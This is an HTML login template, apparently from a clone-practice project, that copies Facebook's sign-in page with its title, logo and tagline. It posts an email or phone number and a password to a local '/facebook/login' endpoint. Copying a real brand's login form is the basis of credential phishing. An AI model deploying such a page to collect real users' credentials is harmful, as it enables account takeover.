<!DOCTYPE html>
<html>
<head>
    <title>Facebook</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="w3hubs.com">
    <link href="https://fonts.googleapis.com/css?family=Nunito+Sans:300i,400,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"/>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
    <link rel="stylesheet" href="/css/login.css">
    <link type="images/png" rel="icon"
          href="https://static-00.iconduck.com/assets.00/facebook-color-icon-2048x2048-bfly1vxr.png">
</head>
<body>
<div class="form-check form-switch mx-4">
    <input
            class="form-check-input p-2"
            type="checkbox"
            role="switch"
            id="flexSwitchCheckChecked"
            checked
            onclick="myFunction()"
    />
</div>
<div class="container">
    <div class="row align-items-center justify-content-center vh-100">
        <div class="col-md-7">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" class="w-50">
            <h3>Facebook helps you connect and share with the people in your life.</h3>
        </div>
        <div class="col-md-5">
            <form class="login-form" action="/facebook/login" method="post">

                <div class="mb-3 text-center">
                    <a href="#" class="youtube-icon"><i class="fab fa-facebook fa-beat" style="font-size: 40px"></i></a>
                </div>
                <div th:if="${message}" >
                    <p th:text="${message}"></p>
                </div>
                <div class="mb-3" style="position: relative;">
                    <input id="identifier" name="identifier" type="text" class="form-control"
                           placeholder="Email address or phone number" required
                           style="color: var(--color-dark); background: var(--color-white); padding-right: 30px;">
                    <i class="fa-solid fa-user" style="position: absolute; top: 50%; transform: translateY(-50%); right: 8px;"></i>
                </div>

                <div class="mb-3" style="position: relative;">
                    <input id="password" name="password" type="password" class="form-control" placeholder="Password"
                           required style=" color: var(--color-dark);
                    background: var(--color-white);">
                    <i class="fa-solid fa-lock"style="position: absolute; top: 50%; transform: translateY(-50%); right: 8px;"></i>
                </div>

                <button type="submit" class="btn btn-custom btn-lg btn-block mt-3">Login</button>

            </form>
        </div>
    </div>
</div>
<script src="/js/script.js"></script>


</body>
</html>
